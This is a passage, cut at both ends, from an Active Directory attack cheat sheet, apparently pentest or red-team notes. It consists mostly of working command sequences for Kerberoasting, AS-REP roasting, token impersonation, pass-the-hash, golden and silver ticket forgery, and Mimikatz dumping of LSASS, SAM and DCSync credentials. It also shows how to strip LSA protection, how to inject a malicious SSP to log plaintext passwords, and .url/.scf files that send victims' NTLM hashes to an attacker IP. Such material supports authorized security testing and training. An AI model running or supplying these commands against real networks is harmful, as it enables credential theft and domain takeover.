Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "UserOrGroupToQuery"}

# Look for servers with Unconstrained Delegation enabled
## If available and you have admin privs on this server, get user TGT (see below)
Get-DomainComputer -Unconstrained

# Look for users or computers with Constrained Delegation enabled
## If available and you have user/computer hash, access service machine as DA (see below)
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

### Bloodhound 
```
# Run all checks, including restricted groups enforced through the domain  🚩
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup

# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy 🚩
Invoke-BloodHound -CollectionMethod LoggedOn
```
------
## Kerberoasting 
### Automatic 
```
# With PowerView
Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"

# Crack the hash with Hashcat:

hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

### Manual 

```
# Request TGS for kerberoastable account (SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"

# Dump TGS to disk
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack with TGSRepCrack
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
```

### Targeted kerberoasting by setting SPN
```
# We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:

Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}
```

-----
## AS-REP roasting

```
# Get the hash for a roastable user (see above for hunting). Using ASREPRoast.ps1:
Get-ASREPHash -UserName TargetUser
# Crack the hash with Hashcat:

hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

### Targeted AS-REP roasting by disabling Kerberos pre-authentication
```
# Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:

Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
```
-----
## Token Manipulation
Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the ‘Steal Token’ functionality in Cobalt Strike).

### Incognito
```
# Show tokens on the machine
.\incognito.exe list_tokens -u

# Start new process with token of a specific user
.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe
```

### Invoke-TokenManipulation
```
# Show all tokens on the machine
Invoke-TokenManipulation -ShowAll

# Show only unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate

# Start new process with token of a specific user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"

# Start new process with token of another process
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
```

-----
### Lateral Movement with Rubeus

We can use Rubeus to execute a technique called “Overpass-the-Hash”. In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberost ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.

```
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```
Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.

***
### Lateral Movement with Mimikatz 

```
# Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe

# Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands
sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe

# Golden ticket (domain admin, w/ some ticket properties to avoid detection)
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Silver ticket for a specific SPN with a compromised service / machine account
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

## Tools

- [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [AD Module](https://github.com/samratashok/ADModule)
- [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
- [Adalanche](https://github.com/lkarlslund/adalanche)

## Domain Enumeration

### Using PowerView

[Powerview v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>
[Powerview Wiki](https://powersploit.readthedocs.io/en/latest/)

- **Get Current Domain:** `Get-Domain`
- **Enumerate Other Domains:** `Get-Domain -Domain <DomainName>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Policy:**

  ```powershell
  Get-DomainPolicy

  #Will show us the policy configurations of the Domain about system access or kerberos
  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
  ```

- **Get Domain Controllers:**
  ```powershell
  Get-DomainController
  Get-DomainController -Domain <DomainName>
  ```
- **Enumerate Domain Users:**

  ```powershell
  #Save all Domain Users to a file
  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

  #Will return specific properties of a specific user
  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

  #Enumerate user logged on a machine
  Get-NetLoggedon -ComputerName <ComputerName>

  #Enumerate Session Information for a machine
  Get-NetSession -ComputerName <ComputerName>

  #Enumerate domain machines of the current/specified domain where specific users are logged into
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
  ```

- **Enum Domain Computers:**

  ```powershell
  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

  #Enumerate Live machines
  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
  ```

- **Enum Groups and Group Members:**

  ```powershell
  #Save all Domain Groups to a file:
  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

  #Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
  Get-NetLocalGroup | Select-Object GroupName

  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```

- **Enumerate Shares:**

  ```powershell
  #Enumerate Domain Shares
  Find-DomainShare

  #Enumerate Domain Shares the current user has access
  Find-DomainShare -CheckShareAccess

  #Enumerate "Interesting" Files on accessible shares
  Find-InterestingDomainShareFile -Include *passwords*
  ```

- **Enum Group Policies:**

  ```powershell
  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

  #Enumerate all GPOs to a specific computer
  Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

  #Get users that are part of a Machine's local Admin group
  Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
  ```

- **Enum OUs:**
  ```powershell
  Get-DomainOU -Properties Name | Sort-Object -Property Name
  ```
- **Enum ACLs:**

  ```powershell
  # Returns the ACLs associated with the specified account
  Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

  #Search for interesting ACEs
  Find-InterestingDomainAcl -ResolveGUIDs

  #Check the ACLs associated with a specified path (e.g smb share)
  Get-PathAcl -Path "\\Path\Of\A\Share"
  ```

- **Enum Domain Trust:**

  ```powershell
  Get-DomainTrust
  Get-DomainTrust -Domain <DomainName>

  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
  Get-DomainTrustMapping
  ```

- **Enum Forest Trust:**

  ```powershell
  Get-ForestDomain
  Get-ForestDomain -Forest <ForestName>

  #Map the Trust of the Forest
  Get-ForestTrust
  Get-ForestTrust -Forest <ForestName>
  ```

- **User Hunting:**

  ```powershell
  #Finds all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  #Find local admins on all machines of the domain
  Find-DomainLocalGroupMember -Verbose

  #Find computers were a Domain Admin OR a spesified user has a session
  Find-DomainUserLocation | Select-Object UserName, SessionFromName

  #Confirming admin access
  Test-AdminAccess
  ```

  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!

### Using AD Module

- **Get Current Domain:** `Get-ADDomain`
- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Controlers:**

  ```powershell
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
  ```

- **Enumerate Domain Users:**

  ```powershell
  Get-ADUser -Filter * -Identity <user> -Properties *

  #Get a spesific "string" on a user's attribute
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
  ```

- **Enum Domain Computers:**
  ```powershell
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter *
  ```
- **Enum Domain Trust:**
  ```powershell
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <DomainName>
  ```
- **Enum Forest Trust:**

  ```powershell
  Get-ADForest
  Get-ADForest -Identity <ForestName>

  #Domains of Forest Enumeration
  (Get-ADForest).Domains
  ```

- **Enum Local AppLocker Effective Policy:**

  ```powershell
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  ```

### Using BloodHound

#### Remote BloodHound

[Python BloodHound Repository](https://github.com/fox-it/BloodHound.py) or install it with `pip3 install bloodhound`

```powershell
bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
```

#### On Site BloodHound

```powershell
#Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>

#Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
```

### Using Adalanche

#### Remote Adalanche

```bash
# kali linux:
./adalanche collect activedirectory --domain <Domain> \
--username <Username@Domain> --password <Password> \
--server <DC>

# Example:
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb
## -> Terminating successfully

## Any error?:

# LDAP Result Code 200 "Network Error": x509: certificate signed by unknown authority ?

./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389

# Invalid Credentials ?
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389 \
--authmode basic

# Analyze data 
# go to web browser -> 127.0.0.1:8080
./adalanche analyze
```

### Useful Enumeration Tools

|**Commands** |**Description**|
|---|---|
|[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) |Information dumper via LDAP|
| [adidnsdump](https://github.com/dirkjanm/adidnsdump) |Integrated DNS dumping by any authenticated user|
|[ACLight](https://github.com/cyberark/ACLight) |Advanced Discovery of Privileged Accounts|
|[ADRecon](https://github.com/sense-of-security/ADRecon)| Detailed Active Directory Recon Tool|

## Local Privilege Escalation

|**Commands** |**Description**|
|---|---|
|[Windows Privilege Escalation CheatSheet (https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet) |Cheat Sheet for Windows Local Privilege Escalations|
| [Juicy Potato](https://github.com/ohpe/juicy-potato) |Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803|
|[Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) |Automated Juicy Potato :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803|
|[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |Exploit the PrinterBug for System Impersonation :pray: Works for Windows Server 2019 and Windows 10|
| [RoguePotato](https://github.com/antonioCoco/RoguePotato) |Upgraded Juicy Potato  :pray: Works for Windows Server 2019 and Windows 10|
|[Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)||
|[SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/)   [PoC](https://github.com/danigargu/CVE-2020-0796)||
| [CVE-2021-36934 (HiveNightmare/SeriousSAM)](https://github.com/cube0x0/CVE-2021-36934)||

### Useful Local Priv Esc Tools

|**Commands** |**Description**|
|---|---|
|[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) |Misconfiguration Abuse|
| [BeRoot](https://github.com/AlessandroZ/BeRoot) |General Priv Esc Enumeration Tool|
| [Privesc](https://github.com/enjoiz/Privesc) |General Priv Esc Enumeration Tool|
| [FullPowers](https://github.com/itm4n/FullPowers)| Restore A Service Account's Privileges|

## Lateral Movement

### PowerShell Remoting

```powershell
#Enable PowerShell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

### Remote Code Execution with PS Credentials

```powershell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

### Import a PowerShell Module and Execute its Functions Remotely

```powershell
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess

#Interact with the session
Enter-PSSession -Session $sess

```

### Executing Remote Stateful commands

```powershell
#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

### Mimikatz

```powershell
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?

- LSA as a Protected Process (Kernel Land Bypass)

  ```powershell
  #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
  #Now lets import the mimidriver.sys to the system
  mimikatz # !+

  #Now lets remove the protection flags from lsass.exe process
  mimikatz # !processprotect /process:lsass.exe /remove

  #Finally run the logonpasswords function to dump lsass
  mimikatz # sekurlsa::logonpasswords
  ```

- LSA as a Protected Process (Userland "Fileless" Bypass)

  - [PPLdump](https://github.com/itm4n/PPLdump)
  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)

- LSA is running as virtualized process (LSAISO) by Credential Guard

  ```powershell
  #Check if a process called lsaiso.exe exists on the running processes
  tasklist |findstr lsaiso

  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
  mimikatz # misc::memssp

  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
  ```

- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

### Remote Desktop Protocol

If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.

- Mimikatz:

  ```powershell
  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
  privilege::debug
  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"

  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
  ```

- xFreeRDP:

```powershell
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
```

:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".

### URL File Attacks

- .url file

  ```
  [InternetShortcut]
  URL=whatever
  WorkingDirectory=whatever
  IconFile=\\<AttackersIp>\%USERNAME%.icon
  IconIndex=1
  ```

  ```
  [InternetShortcut]
  URL=file://<AttackersIp>/leak/leak.html
  ```

- .scf file

  ```
  [Shell]
  Command=2
  IconFile=\\<AttackersIp>\Share\test.ico
  [Taskbar]
  Command=ToggleDesktop
  ```

Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.

:exclamation: .scf file attacks won't work on the latest versions of Windows.

### Useful Tools

- [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward
  capabilities.
- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
- [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) creates all possible file formats for url file attacks

## Domain Privilege Escalation

### Kerberoast

_WUT IS DIS?:_ \
 All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"  
 account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.

- PowerView:

  ```powershell
  #Get User Accounts that are used as Service Accounts
  Get-NetUser -SPN

  #Get every available SPN account, request a TGS and dump its hash
  Invoke-Kerberoast

  #Requesting the TGS for a single account:
  Request-SPNTicket

  #Export all tickets using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::list /export"'
  ```

- AD Module:

  ```powershell
  #Get User Accounts that are used as Service Accounts
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```

- Impacket:

  ```powershell
  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
  ```

- Rubeus:

  ```powershell
  #Kerberoasting and outputing on a file with a spesific format
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

  #Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

  #Kerberoast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

  #Kerberoast spesific user account
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

  #Kerberoast by specifying the authentication credentials
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
  ```

### ASREPRoast

_WUT IS DIS?:_ \
 If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  
 blob and bruteforce it offline.

- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
Check for interesting permissions on accounts:

**Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!

PowerView:

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```

- And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.

  ```powershell
  #Get a spesific Accounts hash:
  Get-ASREPHash -UserName <UserName> -Verbose

  #Get any ASREPRoastable Users hashes:
  Invoke-ASREPRoast -Verbose
  ```

- Using Rubeus:

  ```powershell
  #Trying the attack for all domain users
  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  #ASREPRoast spesific user
  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  #ASREPRoast users of a spesific OU (Organization Unit)
  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

- Using Impacket:

  ```powershell
  #Trying the attack for the specified users on the file
  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
  ```

### Password Spray Attack

If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
on other domain accounts.

**Tools:**

- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
- [Spray](https://github.com/Greenwolf/Spray)

### Force Set SPN

_WUT IS DIS ?:
If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it._

- PowerView:

  ```powershell
  #Check for interesting permissions on accounts:
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

  #Check if current user has already an SPN setted:
  Get-DomainUser -Identity <UserName> | select serviceprincipalname

  #Force set the SPN on the account:
  Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  ```

- AD Module:

  ```powershell
  #Check if current user has already an SPN setted
  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName

  #Force set the SPN on the account:
  Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
  ```

Finally use any tool from before to grab the hash and kerberoast it!

### Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.

```powershell
#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

#List shadow copies using diskshadow
diskshadow list shadows all

#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1. You can dump the backuped SAM database and harvest credentials.
2. Look for DPAPI stored creds and decrypt them.
3. Access backuped sensitive files.

### List and Decrypt Stored Credentials using Mimikatz

Usually encrypted credentials are stored in:

- `%appdata%\Microsoft\Credentials`
- `%localappdata%\Microsoft\Credentials`

```powershell
#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```

Detailed Article:
[DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

### Unconstrained Delegation

_WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
high value target or DA to connect to it, steal his TGT then ptt and impersonate him!_

Using PowerView:

```powershell
#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay
<WaitInterval> -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```

**Note:** We can also use Rubeus!

### Constrained Delegation

Using PowerView and Kekeo:

```powershell
#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

_ALTERNATIVE:_
Using Rubeus:

```powershell
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
```

Now we can access the service as the impersonated user!

:triangular_flag_on_post: **What if we have delegation rights for only a spesific SPN? (e.g TIME):**

In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

### Resource Based Constrained Delegation

_WUT IS DIS?: \
TL;DR \
If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._

Tools we are going to use:

- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Rubeus](https://github.com/GhostPack/Rubeus)

First we need to enter the security context of the user/machine account that has the privileges over the object.
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.

Exploitation Example:

```powershell
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
